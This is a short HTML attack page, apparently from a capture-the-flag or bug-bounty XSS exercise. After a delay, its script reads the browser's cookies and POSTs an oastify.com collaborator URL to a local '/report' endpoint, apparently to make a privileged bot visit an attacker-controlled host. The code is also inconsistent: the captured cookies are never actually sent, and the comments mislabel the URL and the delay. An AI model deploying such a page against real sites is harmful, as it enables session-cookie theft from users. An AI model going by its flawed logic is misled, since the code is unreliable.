
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sending Cookie...</title>
    <script>
        setTimeout(() => {
            // Capture cookies
            var cookies = document.cookie;
            var targetUrl = "https://k5qhq6zvehxbe36z2n30wa0tyk4bs1gq.oastify.com"; // Capture current URL

            // Send a POST request with the cookies and URL
            fetch("http://localhost:5000/report", {
                method: "POST",
                headers: { "Content-Type": "application/x-www-form-urlencoded" },
                body: new URLSearchParams({ url: targetUrl })
            }).catch(error => {
                console.error("Failed to send cookies:", error);
            });
        }, 8000); // Wait 5 seconds before executing
    </script>
</head>
<body>
    <h1>Sending Cookies...</h1>
    <p>If this page does nothing, <a href="#" onclick="location.reload();">click here</a> to try again.</p>
</body>
</html>
